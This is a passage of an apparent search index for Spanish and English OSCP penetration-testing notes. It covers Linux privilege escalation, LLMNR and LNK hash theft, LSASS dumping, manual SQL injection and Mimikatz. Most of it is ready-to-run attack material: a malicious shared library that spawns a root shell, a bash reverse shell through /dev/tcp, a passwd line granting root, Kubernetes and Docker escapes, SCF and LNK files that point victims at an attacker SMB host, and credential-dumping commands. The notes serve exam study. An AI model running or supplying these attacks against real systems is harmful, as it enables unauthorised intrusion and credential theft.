potencialmente permitiendo acceder a informaci\u00f3n sensible o modificar el comportamiento de otros procesos. <code>cap_sys_nice</code> Permite aumentar o disminuir la prioridad de los procesos, potencialmente permitiendo acceder a recursos que de otro modo estar\u00edan restringidos. <code>cap_sys_time</code> Permite modificar el reloj del sistema, potencialmente permitiendo manipular marcas de tiempo o causar que otros procesos se comporten de manera inesperada. <code>cap_sys_resource</code> Permite modificar los l\u00edmites de recursos del sistema, como el n\u00famero m\u00e1ximo de descriptores de archivos abiertos o la cantidad m\u00e1xima de memoria que se puede asignar. <code>cap_sys_module</code> Permite cargar y descargar m\u00f3dulos del kernel, potencialmente permitiendo modificar el comportamiento del sistema operativo o acceder a informaci\u00f3n sensible. <code>cap_net_bind_service</code> Permite enlazar a puertos de red, potencialmente permitiendo acceder a informaci\u00f3n sensible o realizar acciones no autorizadas. Valor de Capacidad Descripci\u00f3n <code>=</code> Este valor establece la capacidad especificada para el ejecutable, pero no otorga ning\u00fan privilegio. Esto puede ser \u00fatil si queremos borrar una capacidad previamente establecida para el ejecutable. <code>+ep</code> Este valor otorga los privilegios efectivos y permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite, pero no le permite realizar acciones que no est\u00e9n permitidas por la capacidad. <code>+ei</code> Este valor otorga privilegios suficientes y heredables para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite y que los procesos hijos generados por el ejecutable hereden la capacidad y realicen las mismas acciones. <code>+p</code> Este valor otorga los privilegios permitidos para la capacidad especificada al ejecutable. Esto permite que el ejecutable realice las acciones que la capacidad permite, pero no le permite realizar acciones que no est\u00e9n permitidas por la capacidad. Esto puede ser \u00fatil si queremos otorgar la capacidad al ejecutable pero evitar que herede la capacidad o que los procesos hijos la hereden. Capacidad Descripci\u00f3n <code>cap_setuid</code> Permite a un proceso establecer su ID de usuario efectivo, lo que puede usarse para obtener los privilegios de otro usuario, incluido el usuario root. <code>cap_setgid</code> Permite establecer su ID de grupo efectivo, lo que puede usarse para obtener los privilegios de otro grupo, incluido el grupo root. <code>cap_sys_admin</code> Esta capacidad proporciona una amplia gama de privilegios administrativos, incluyendo la capacidad de realizar muchas acciones reservadas para el usuario root, como modificar configuraciones del sistema y montar y desmontar sistemas de archivos. <code>cap_dac_override</code> Permite omitir las verificaciones de permisos de lectura, escritura y ejecuci\u00f3n de archivos."},{"location":"OSCP/linuxPrivEsc/#enumerar-capabilities","title":"Enumerar capabilities","text":"<ul> <li><code>find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;</code>: este comando hace un chequeo de los binarios que tienen capabilities.</li> </ul>"},{"location":"OSCP/linuxPrivEsc/#explotando-capabilities","title":"Explotando capabilities","text":"<ul> <li>Ejemplo: <code>/usr/bin/vim.basic /etc/passwd</code><ul> <li><code>echo -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd</code></li> <li>En este caso el binario vim.basic tiene la capacidad <code>cap_setuid</code> y <code>cap_setgid</code> por lo que podemos ejecutar el comando <code>id</code> como root..</li> </ul> </li> </ul>"},{"location":"OSCP/linuxPrivEsc/#abusar-de-cronjobs","title":"Abusar de cronjobs","text":"<ul> <li>Primero  hay que encontrar directorios o archivos con acceso a escritura: <code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code></li> <li><code>cat /etc/crontab</code> para ver los cronjobs del sistema.</li> <li><code>crontab -l -u root</code> para ver los cronjobs del usuario root.</li> <li>Ahora imaginemonos que hay un script corriendo como root, del cual tenemos acceso de escritura.<ul> <li>Podemos modificar el script para que ejecute un reverse shell haciendo un echo reverse shell + un shift right <code>&gt;&gt;</code> al script.</li> <li><code>echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' &gt;&gt; /etc/cron.daily/script.sh</code></li> <li><code>/tmp/bash -p</code> =&gt; root shell</li> </ul> </li> </ul>"},{"location":"OSCP/linuxPrivEsc/#docker-privilege-escalation","title":"Docker privilege escalation","text":"<ul> <li>La escalaci\u00f3n de privilegios en Linux mediante Docker se basa en explotar configuraciones inseguras del demonio Docker. Un caso com\u00fan ocurre cuando el socket de Docker <code>(/var/run/docker.sock)</code> es accesible por un usuario sin privilegios, lo que permite ejecutar contenedores con permisos elevados y, potencialmente, escapar al sistema host.</li> <li><code>docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash</code><ul> <li>Este comando ejecuta un contenedor Ubuntu en modo chroot, permitiendo ejecutar comandos en el sistema host.</li> <li><code>docker -H unix:///var/run/docker.sock</code> Indica que Docker debe conectarse al socket UNIX <code>/var/run/docker.sock</code>, el cual es el punto de comunicaci\u00f3n entre el cliente y el deamon de Docker.</li> <li>Si un usuario tiene acceso a este socket, puede controlar Docker como root.</li> <li><code>run -v /:/mnt --rm -it ubuntu</code> Crea un contenedor Ubuntu en modo chroot, con acceso a la carpeta ra\u00edz del sistema host.</li> <li><code>chroot /mnt bash</code> Ejecuta el comando bash en el contenedor Ubuntu, permitiendo ejecutar comandos en el sistema host.</li> <li><code>--rm</code> Elimina el contenedor despu\u00e9s de que se haya ejecutado el comando.</li> </ul> </li> </ul>"},{"location":"OSCP/linuxPrivEsc/#kubernetes-privilege-escalation","title":"Kubernetes privilege escalation","text":"<ul> <li>Podemos utilizar la herramienta kubeletctl para obtener el token y certificado de la service account de Kubernetes del servidor.<ul> <li>Para hacer esto tenemos que tener la IP del server, el namespace y pod target.</li> </ul> </li> <li>Extract tokens <code>kubeletctl -i --server 10.129.10.11 exec \"cat /var/run/secrets/kubernetes.io/serviceaccount/token\" -p nginx -c nginx | tee -a k8.token</code></li> <li>Extract certificates `kubeletctl --server 10.129.10.11 exec \"cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\" -p nginx -c nginx | tee -a ca.crt</li> <li>Ahora listamos privilegios:<ul> <li><code>export token=</code>cat k8.token``</li> <li><code>kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list</code></li> </ul> </li> <li>Ahora lo que podemos hacer es crear un YAML para crear un nuevo contenedor y montar el filesystem entero con la carpeta root adentro.</li> </ul> <pre><code>apiVersion: v1\nkind: Pod\nmetadata:\n  name: privesc\n  namespace: default\nspec:\n  containers:\n  - name: privesc\n    image: nginx:1.14.2\n    volumeMounts:\n    - mountPath: /root\n      name: mount-root-into-mnt\n  volumes:\n  - name: mount-root-into-mnt\n    hostPath:\n       path: /\n  automountServiceAccountToken: true\n  hostNetwork: true\n</code></pre>"},{"location":"OSCP/linuxPrivEsc/#creando-nuevo-pod","title":"Creando nuevo pod","text":"<ul> <li><code>kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml</code></li> <li><code>kubeletctl --server 10.129.10.11 exec \"cat /root/root/.ssh/id_rsa\" -p privesc -c privesc</code></li> </ul>"},{"location":"OSCP/linuxPrivEsc/#shared-object-hijacking","title":"Shared Object Hijacking","text":"<ul> <li>Definici\u00f3n: Shared Object Hijacking es un ataque que permite a un atacante inyectar c\u00f3digo malicioso en un proceso que est\u00e1 ejecutando un binario compartido (como un servidor web o un servidor de bases de datos) para que el c\u00f3digo se ejecute en el contexto del proceso.</li> <li>Podemos utilizar ldd para encontrar las librer\u00edas compartidas del binario: `ldd /usr/bin/binario</li> <li>Podemos encontrar las rutas de las librer\u00edas compartidas del binario: <code>strings /usr/bin/binario | grep \"Shared object\" | cut -d \":\" -f 2</code></li> <li> <p>Si encontramos alguna libreria interesante pdemos cargar una libreria compartida personalizada, por ejemplo <code>LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libmysqlclient.so.20.so /usr/bin/binario</code> <pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;unistd.h&gt;\n\nvoid dbquery() {\n    printf(\"Malicious library loaded\\n\");\n    setuid(0);\n    system(\"/bin/sh -p\");\n} \n</code></pre></p> </li> <li> <p><code>gcc src.c -fPIC -shared -o /development/libshared.so</code></p> </li> </ul>"},{"location":"OSCP/linuxPrivEsc/#sudo-policy-bypass","title":"Sudo policy bypass","text":"<ul> <li>Sudo permite con un especifico id de usuario ejecutar comandos como root.</li> <li>El id especificado se encuentra en el fichero <code>/etc/passwd</code>.</li> <li>Ejemplo: <code>cat /etc/passwd | grep cry0l1t3</code> =&gt; <code>cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash</code></li> <li>Podemos ver que este usuario tiene id 1005, si un id negativo entrase como sudo en procesar el id 0 que ser\u00eda unicamente root.</li> </ul> <pre><code>cry0l1t3@nix02:~$ sudo -u#-1 id\n\nroot@nix02:/home/cry0l1t3# id\n\nuid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)\n</code></pre> <ul> <li><code>sudo -u#-1</code> + binario permitido para ejecutar como root. = exploit</li> </ul>"},{"location":"OSCP/linuxPrivEsc/#wildcards-spare-tricks","title":"Wildcards spare tricks","text":"<ul> <li>Definici\u00f3n: Wildcards son caracteres especiales que permiten buscar y manipular archivos y directorios de manera m\u00e1s eficiente.</li> <li>Ataque con 7z: Se pueden crear archivos donde 7z se va a ejecutar y hacer un symlink attack para obtener acceso a archivos que no deber\u00edamos tener acceso.<ul> <li>cd /path/to/7z/acting/folder</li> <li>touch @root.txt</li> <li>ln -s /file/you/want/to/read root.txt</li> </ul> </li> <li>Pensar que con esto se puede conseguir <code>/root/.ssh/id_rsa</code></li> <li>Source</li> </ul>"},{"location":"OSCP/linuxPrivEsc/#flask-privilege-escalation","title":"Flask Privilege Escalation","text":"<ul> <li>Si tenemos un archivo de python editable que corre un servidor Flask, podemos inyectar c\u00f3digo malicioso en el archivo para obtener acceso root.</li> </ul> <pre><code>jack@BitForge:~$ sudo -l\nMatching Defaults entries for jack on bitforge:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty, !env_reset\n\nUser jack may run the following commands on bitforge:\n    (root) NOPASSWD: /usr/bin/flask_password_changer\n</code></pre> <pre><code>from flask import Flask, render_template\nimport subprocess\nimport os\n\napp = Flask(__name__)\n\n@app.route(\"/\")\ndef home():\n    # Comando para iniciar una reverse shell al localhost:9000\n    try:\n        # Usamos /bin/bash para la reverse shell\n        cmd = \"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/9000 0&gt;&amp;1'\"\n        subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        return render_template(\"index.html\")\n    except Exception as e:\n        return f\"Error al iniciar la reverse shell: {str(e)}\"\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", port=5000)\n</code></pre> <ul> <li>Ahora si hacemos curl <code>curl http://localhost:5000/</code> nos va a dar una reverse shell.</li> <li><code>nc -lvnp 9000</code> y tenemos acceso a la shell.</li> </ul>"},{"location":"OSCP/linuxPrivEsc/#bash-gobbling","title":"Bash Gobbling","text":"<ul> <li>Definici\u00f3n: Bash gobbling es un ataque que permite a un atacante ejecutar comandos arbitrarios en un sistema vulnerable al inyectar c\u00f3digo malicioso en una variable de entorno.</li> <li>Este ataque se basa en la forma en que Bash maneja las variables de entorno y los argumentos de l\u00ednea de comandos.</li> <li>Por ejemplo podemos tener un cronjob que ejecute un script de bash con una variable de entorno que contenga un comando malicioso.</li> </ul> <pre><code>[alfredo@fedora tmp]$ cat /usr/local/bin/backup-flask.sh\n#!/bin/sh\nexport PATH=\"/home/alfredo/restapi:$PATH\"\ncd /home/alfredo/restapi\ntar czf /tmp/flask.tar.gz *\n</code></pre> <ul> <li>En este caso el script de backup-flask.sh tiene una variable de entorno PATH que apunta a un directorio donde podemos colocar un script malicioso.</li> <li>\u2705 Corre como root.</li> <li>\u2705 El PATH pone una ruta controlada por el usuario primero.</li> <li>\u2705 Ejecuta tar sin ruta absoluta.</li> <li>Nos paramos sobre el directorio que figura en la variable PATH y creamos un script que se llame <code>tar</code> que agarre el <code>/bin/bash</code> y le de el setuid bit para que corra como root.</li> <li><code>echo -e '#!/bin/bash\\nchmod +s /bin/bash' &gt; tar</code></li> <li><code>chmod +x tar</code></li> <li>Ahora esperamosa que el cronjob corra como root.</li> <li><code>bash -p</code> y tenemos acceso a la shell como root.</li> </ul>"},{"location":"OSCP/linuxPrivEsc/#passwd-con-permisos-de-escritura","title":"passwd con permisos de escritura","text":"<ul> <li>Definici\u00f3n: El archivo <code>/etc/passwd</code> es un archivo de texto que contiene informaci\u00f3n sobre las cuentas de usuario en un sistema Linux. Cada l\u00ednea del archivo representa una cuenta de usuario y contiene varios campos separados por dos puntos (:).</li> <li>Si un atacante puede escribir en este archivo, puede crear cuentas de usuario adicionales o modificar cuentas existentes, lo que puede llevar a la escalaci\u00f3n de privilegios. </li> <li>si podemos meter esta linea: <code>new-user:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash</code> en el archivo <code>/etc/passwd</code> podemos obtener acceso root.</li> <li>pass123 es la contrase\u00f1a de la cuenta new-user.</li> </ul>"},{"location":"OSCP/llmnr/","title":"LLMNR poisoning &amp; NBT-NS","text":""},{"location":"OSCP/llmnr/#link-local-multicast-name-resolution","title":"Link-Local Multicast Name Resolution","text":"<ul> <li>The goal of Link-Local Multicast Name Resolution (LLMNR) is to enable name resolution in scenarios in which conventional DNS name resolution is not possible.  LLMNR supports all current and future DNS formats, types, and classes, while operating on a separate port from DNS, and with a distinct resolver cache.  Since LLMNR only operates on the local link, it cannot be considered a substitute for DNS.</li> </ul>"},{"location":"OSCP/llmnr/#netbios-name-service","title":"NetBIOS Name Service","text":"<ul> <li>microsoft docs</li> </ul>"},{"location":"OSCP/llmnr/#the-poisoning","title":"The poisoning","text":"<ul> <li>the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.</li> <li>The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests.</li> <li>If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password.</li> </ul>"},{"location":"OSCP/llmnr/#useful-tools-for-this-poisoning","title":"Useful tools for this poisoning","text":"<ul> <li>Responder</li> <li>Inveigh</li> <li>Metasploit framework</li> </ul> <p>a medium post</p>"},{"location":"OSCP/llmnr/#scf-llmnr-poisoning","title":"SCF + LLMNR poisoning","text":"<ul> <li>Primero creamos un artchivo SCF con el siguiente contenido: <code>[Shell] Command=2 IconFile=\\\\10.10.14.3\\share\\legit.ico [Taskbar] Command=ToggleDesktop</code></li> <li>El nombre del archivo tiene que ser algo como <code>@Inventory.scf</code>.</li> <li>Este archivo lo tenemos que poner en un share que sea accesible por la victima.</li> <li>Luego, con responder capturamos el hash de la victima y lo crackeamos.</li> </ul>"},{"location":"OSCP/lnk-attacks/","title":"Link File Attacks","text":"<ul> <li>Link File Attacks</li> <li> <p>Con NetExec <code>nxc smb 172.16.139.0/24 -u 'pthorpe' -p creds.txt -M slinky -o SERVER=172.16.139.10 NAME=urgent</code></p> </li> <li> <p>Manual:</p> <ul> <li>C\u00f3digo:</li> </ul> <pre><code>$objShell = New-Object -ComObject WScript.shell\n$lnk = $objShell.CreateShortcut(\"C:\\test.lnk\")\n$lnk.TargetPath = \"\\\\192.168.138.149\\@test.png\"\n$lnk.WindowStyle = 1\n$lnk.IconLocation = \"%windir%\\system32\\shell32.dll, 3\"\n$lnk.Description = \"Test\"\n$lnk.HotKey = \"Ctrl+Alt+T\"\n$lnk.Save()\n</code></pre> <ul> <li><code>smbserver.py -smb2support \"icon\" .</code></li> </ul> </li> </ul>"},{"location":"OSCP/lnk-attacks/#con-ntlm-theft","title":"Con NTLM Theft","text":"<ul> <li><code>git clone https://github.com/Greenwolf/ntlm_theft</code></li> <li><code>cd ntlm_theft</code></li> <li><code>python3 ntlm_theft.py --generate all --server 10.10.14.48 --filename icon</code></li> <li><code>impacket-smbclient USER:'PASSWORD'@fIP</code><ul> <li>shares</li> <li>use share con acceso a escritura</li> </ul> </li> <li><code>sudo responder -I tun0</code> o <code>impacket-smbserver -smb2support shareName someDir</code></li> </ul>"},{"location":"OSCP/lookupsid/","title":"AD User enumeration with Impacket lookupsid.py","text":"<ul> <li>Este script permite enumerar los SID de los usuarios de un dominio de Active Directory.</li> <li>El SID (Security Identifier) es un identificador \u00fanico que se asigna a cada objeto de seguridad en un dominio de Active Directory.</li> <li>El SID se utiliza para controlar el acceso a los recursos y para identificar a los usuarios y grupos en el dominio.</li> </ul>"},{"location":"OSCP/lookupsid/#uso-basico","title":"Uso basico","text":"<ul> <li><code>impacket-lookupsid.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt;</code></li> </ul> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/boxes/cicada]\n\u2514\u2500$ lookupsid.py guest@cicada.htb &gt; lookupsid.txt\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nPassword:\n[*] Brute forcing SIDs at cicada.htb\n[*] StringBinding ncacn_np:cicada.htb[\\pipe\\lsarpc]\n[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727\n498: CICADA\\Enterprise Read-only Domain Controllers (SidTypeGroup)\n500: CICADA\\Administrator (SidTypeUser)\n501: CICADA\\Guest (SidTypeUser)\n502: CICADA\\krbtgt (SidTypeUser)\n512: CICADA\\Domain Admins (SidTypeGroup)\n513: CICADA\\Domain Users (SidTypeGroup)\n514: CICADA\\Domain Guests (SidTypeGroup)\n515: CICADA\\Domain Computers (SidTypeGroup)\n516: CICADA\\Domain Controllers (SidTypeGroup)\n517: CICADA\\Cert Publishers (SidTypeAlias)\n518: CICADA\\Schema Admins (SidTypeGroup)\n519: CICADA\\Enterprise Admins (SidTypeGroup)\n520: CICADA\\Group Policy Creator Owners (SidTypeGroup)\n521: CICADA\\Read-only Domain Controllers (SidTypeGroup)\n522: CICADA\\Cloneable Domain Controllers (SidTypeGroup)\n525: CICADA\\Protected Users (SidTypeGroup)\n526: CICADA\\Key Admins (SidTypeGroup)\n527: CICADA\\Enterprise Key Admins (SidTypeGroup)\n553: CICADA\\RAS and IAS Servers (SidTypeAlias)\n571: CICADA\\Allowed RODC Password Replication Group (SidTypeAlias)\n572: CICADA\\Denied RODC Password Replication Group (SidTypeAlias)\n1000: CICADA\\CICADA-DC$ (SidTypeUser)\n1101: CICADA\\DnsAdmins (SidTypeAlias)\n1102: CICADA\\DnsUpdateProxy (SidTypeGroup)\n1103: CICADA\\Groups (SidTypeGroup)\n1104: CICADA\\john.smoulder (SidTypeUser)\n1105: CICADA\\sarah.dantelia (SidTypeUser)\n1106: CICADA\\michael.wrightson (SidTypeUser)\n1108: CICADA\\david.orelious (SidTypeUser)\n1109: CICADA\\Dev Support (SidTypeGroup)\n1601: CICADA\\emily.oscars (SidTypeUser)\n</code></pre>"},{"location":"OSCP/lookupsid/#filtrar-con-awk","title":"Filtrar con awk","text":"<ul> <li><code>cat lookupsid.txt | awk -F: '{print $2}' | awk '{print $1}'</code></li> </ul>"},{"location":"OSCP/lsass/","title":"Attacking LSASS","text":""},{"location":"OSCP/lsass/#lsass-is-a-critical-service-that-plays-a-central-role-in-credential-management-and-the-authentication-processes-in-all-windows-operating-systems","title":"LSASS is a critical service that plays a central role in credential management and the authentication processes in all Windows operating systems","text":""},{"location":"OSCP/lsass/#upon-initial-logon-lsass-will","title":"Upon initial logon, LSASS will:","text":"<ul> <li>Cache credentials locally in memory</li> <li>Create access tokens</li> <li>Enforce security policies</li> <li>Write to Windows security log</li> </ul>"},{"location":"OSCP/lsass/#dumping-lsass-process-memory-gui","title":"Dumping LSASS Process Memory (GUI)","text":""},{"location":"OSCP/lsass/#open-task-manager-select-the-processes-tab-find-right-click-the-local-security-authority-process-select-create-dump-file","title":"Open Task Manager &gt; Select the Processes tab &gt; Find &amp; right click the Local Security Authority Process &gt; Select Create dump file","text":"<p><code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp</code></p>"},{"location":"OSCP/lsass/#with-cli","title":"With CLI","text":""},{"location":"OSCP/lsass/#finding-lsass-pid-in-cmd","title":"Finding LSASS PID in cmd","text":"<pre><code>C:\\Windows\\system32&gt; tasklist /svc\n\nImage Name                     PID Services\n========================= ======== ============================================\nSystem Idle Process              0 N/A\nSystem                           4 N/A\nRegistry                        96 N/A\nsmss.exe                       344 N/A\ncsrss.exe                      432 N/A\nwininit.exe                    508 N/A\ncsrss.exe                      520 N/A\nwinlogon.exe                   580 N/A\nservices.exe                   652 N/A\nlsass.exe                      672 KeyIso, SamSs, VaultSvc\nsvchost.exe                    776 PlugPlay\nsvchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,\n                                   SystemEventsBroker\nfontdrvhost.exe                812 N/A\n</code></pre> <p>or</p> <pre><code>PS C:\\Windows\\system32&gt; Get-Process lsass\n\nHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n   1260      21     4948      15396       2.56    672   0 lsass\n</code></pre>"},{"location":"OSCP/lsass/#creating-lsassdmp-using-powershell","title":"Creating lsass.dmp using PowerShell","text":""},{"location":"OSCP/lsass/#we-need-elevated-privs","title":"We need elevated privs","text":"<p><code>PS C:\\Windows\\system32&gt; rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full</code> - Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing</p>"},{"location":"OSCP/lsass/#dump-it-locally","title":"dump it locally","text":"<p><code>pypykatz lsa minidump lsass.dmp</code></p>"},{"location":"OSCP/manualSQLI/","title":"Manual SQL injection","text":""},{"location":"OSCP/manualSQLI/#ventajas-de-la-inyeccion-sql-a-mano","title":"Ventajas de la inyecci\u00f3n sql a mano","text":"<ul> <li>Es m\u00e1s facil de bypasear los filtros de seguridad como WAF o IDS</li> <li>obtenemos m\u00e1s control sobre la inyecci\u00f3n</li> </ul> <p>CheatSheets de inyecciones SQL manuales</p>"},{"location":"OSCP/manualSQLI/#el-orden-es-db-tabla-columnas","title":"El orden es DB =&gt; Tabla =&gt; Columnas","text":""},{"location":"OSCP/manualSQLI/#deteccion","title":"Detecci\u00f3n","text":"<ul> <li>Primero verificamos si la aplicaci\u00f3n es vulnerable a inyecci\u00f3n sql con payloads como: <code>' or 1=1--</code>, o si no <code>-- +</code> o <code>#</code></li> <li>Si la aplicaci\u00f3n es vulnerable, podemos usar <code>UNION SELECT</code> para obtener informaci\u00f3n de otras tablas</li> <li>Si la aplicaci\u00f3n no es vulnerable a <code>UNION SELECT</code>, podemos usar <code>ORDER BY</code> para obtener informaci\u00f3n de otras tablas<ul> <li><code>ORDER BY</code> nos permite ordenar los resultados de una consulta SQL</li> </ul> </li> <li><code>10' union select 1,2,3,4,5,6 -- -</code><ul> <li>Entonces tenemos la consulta:<ul> <li>10: es el id de la consulta legitima</li> <li>': es el delimitador de la consulta que hace que la consulta se rompa</li> <li>union select: es la parte que nos permite unir dos consultas</li> <li>1,2,3,4,5,6: son los valores que queremos obtener de la segunda consulta</li> </ul> </li> </ul> </li> <li>Partiendo de <code>10' union select 1, X,3,4,5,6 -- -</code> podemos hacer otro tipo de consultas como que db usa, etc.<ul> <li><code>10' union select 1, database(),3,4,5,6 -- -</code></li> </ul> </li> <li>Si quiero listar TODAS las bases de datos:<ul> <li><code>10' union select 1, schema_name,3,4,5,6 from information_schema.schemata -- -</code></li> </ul> </li> <li>Ahora por ejemplo si queremos saber que tablas hay en la base de datos podemos hacer:<ul> <li><code>10' union select 1, table_name,3,4,5,6 from information_schema.tables where table_schema=database() -- -</code></li> <li>Para ver todas las tablas de una base de datos:</li> <li><code>10' union select 1, table_name,3,4,5,6 from information_schema.tables where table_schema='NOMBRE_BASE_DE_DATOS' -- -</code></li> <li>Para ver todas las columnas de una tabla:<ul> <li><code>10' union select 1, column_name,3,4,5,6 from information_schema.columns where table_name='NOMBRE_TABLA' -- -</code></li> </ul> </li> <li>Ahora para dumpear la informaci\u00f3n de la tabla podemos hacer:<ul> <li><code>10' union select 1, column1, column2,4,5,6 from table_name -- -</code></li> </ul> </li> <li>Ejemplo:<ul> <li><code>10' union select 1, username, password,4,5,6 from users -- -</code></li> <li><code>10' union select 1, column1, column2,4,5,6 from database_name.table_name -- -</code></li> </ul> </li> </ul> </li> </ul>"},{"location":"OSCP/mimikatz/","title":"Mimikatz","text":""},{"location":"OSCP/mimikatz/#comandos-basicos","title":"Comandos b\u00e1sicos","text":"<p><code>privilege::debug</code> - Eleva privilegios para acceder a procesos protegidos del sistema.</p> <p><code>token::elevate</code> - Eleva el token del proceso actual a SYSTEM (si es posible).</p> <p><code>version</code> - Muestra la versi\u00f3n de Mimikatz y detalles del sistema operativo.</p>"},{"location":"OSCP/mimikatz/#dumpear-creds","title":"Dumpear creds","text":"<p><code>sekurlsa::logonpasswords</code> - Lista todas las sesiones activas y sus credenciales en memoria (incluye contrase\u00f1as y hashes).</p> <p><code>sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:COMMAND</code> - Inicia un proceso autenticado usando Pass the Hash.</p> <p><code>lsadump::sam</code> - Extrae hashes NTLM y LM de cuentas locales desde el archivo SAM.</p> <p><code>lsadump::lsa /patch</code> - Extrae secretos LSA del sistema, como contrase\u00f1as de servicios y claves de dominio.</p> <p><code>lsadump::dcsync /user:USERNAME</code> - Simula una replicaci\u00f3n de controlador de dominio (DCSync) para obtener hashes de un usuario espec\u00edfico.</p> <p><code>lsadump::dcsync /all /csv</code> - Extrae hashes de todos los usuarios del dominio y los exporta en formato CSV.</p>"},{"location":"OSCP/mimikatz/#intentar-habilitar-wdigest-para-almacenar-credenciales-en-texto-plano","title":"Intentar habilitar WDigest para almacenar credenciales en texto plano","text":"<ul> <li><code>reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code><ul> <li>privilege::debug</li> <li>sekurlsa::logonpasswords</li> </ul> </li> </ul>"},{"location":"OSCP/mimikatz/#kerberos","title":"Kerberos","text":"<p><code>kerberos::list /export</code> - Lista los tickets Kerberos disponibles en memoria y los exporta a archivos .kirbi.</p> <p><code>kerberos::ptt FILE.kirbi</code> - Inyecta un ticket Kerberos en la sesi\u00f3n actual.</p> <p><code>kerberos::golden</code> - Genera un Golden Ticket para autenticarse como cualquier usuario en el dominio.</p>"},{"location":"OSCP/mimikatz/#seguidilla-de-comandos-al-conseguir-mimikatz-recomendada","title":"Seguidilla de comandos al conseguir mimikatz recomendada","text":"<p><code>.\\mimikatz.exe \"privilege::debug\"\u00a0\"token::elevate\"\u00a0\"sekurlsa::logonpasswords\"\u00a0\"lsadump::lsa /inject\"\u00a0\"lsadump::sam\"\u00a0\"lsadump::cache\"\"sekurlsa::ekeys\"\u00a0\"exit\"</code></p>"},{"location":"OSCP/mimikatz/#windows-credential-guard","title":"Windows Credential Guard","text":"<p>Windows Credential Guard es una caracter\u00edstica de seguridad introducida por Microsoft para proteger credenciales sensibles almacenadas en memoria. Cuando est\u00e1 habilitada, el proceso LSASS (Local Security Authority Subsystem Service) utiliza un entorno aislado llamado LSAISO.exe (LSA Isolated) que opera en un nivel de confianza superior (VTL1) al del sistema operativo normal (VTL0). Esto significa que incluso con privilegios de SYSTEM, no se puede acceder directamente a las credenciales protegidas.</p>"},{"location":"OSCP/mimikatz/#limitaciones-de-mimikatz-con-credential-guard","title":"Limitaciones de Mimikatz con Credential Guard","text":"<ul> <li>Usuarios no locales: Credential Guard est\u00e1 dise\u00f1ado para proteger credenciales de usuarios de dominio, mientras que las credenciales de usuarios locales a\u00fan pueden ser extra\u00eddas.</li> <li>Credenciales cifradas: Las credenciales de dominio almacenadas en LSASS est\u00e1n cifradas y no son accesibles directamente.</li> </ul>"},{"location":"OSCP/mimikatz/#deshabilitar-credential-guard","title":"Deshabilitar Credential Guard","text":"<p>Para deshabilitar Credential Guard y permitir que Mimikatz acceda a las credenciales en memoria: 1. Ejecutar <code>bcdedit /set hypervisorlaunchtype off</code> para deshabilitar el Hypervisor. 2. Reiniciar el sistema.</p>"},{"location":"OSCP/mimikatz/#alternativa-captura-de-credenciales-en-texto-plano","title":"Alternativa: Captura de credenciales en texto plano","text":"<p>Si no es posible deshabilitar Credential Guard, se puede usar el m\u00f3dulo <code>misc::memssp</code> de Mimikatz para interceptar credenciales en texto plano durante el inicio de sesi\u00f3n: 1. Inyectar el SSP malicioso con <code>misc::memssp</code>. 2. Esperar a que un usuario inicie sesi\u00f3n en el sistema. 3. Revisar el archivo de registro generado en <code>C:\\Windows\\System32\\mimilsa.log</code> para obtener las credenciales capturadas.</p>"},{"location":"OSCP/mimikatz/#consideraciones-finales","title":"Consideraciones finales","text":"<p>Credential Guard es una mitigaci\u00f3n efectiva contra ataques basados en credenciales, pero no es infalible. Los atacantes pueden recurrir a t\u00e9cnicas como la inyecci\u00f3n de SSP para capturar credenciales en texto plano durante el inicio de sesi\u00f3n. Es importante implementar medidas adicionales, como el uso de autenticaci\u00f3n multifactor y la segmentaci\u00f3n de redes, para reducir el riesgo de compromisos.</p>"},{"location":"OSCP/msf/","title":"Metasploit tricks","text":""},{"location":"OSCP/msf/#encode-payloads","title":"Encode 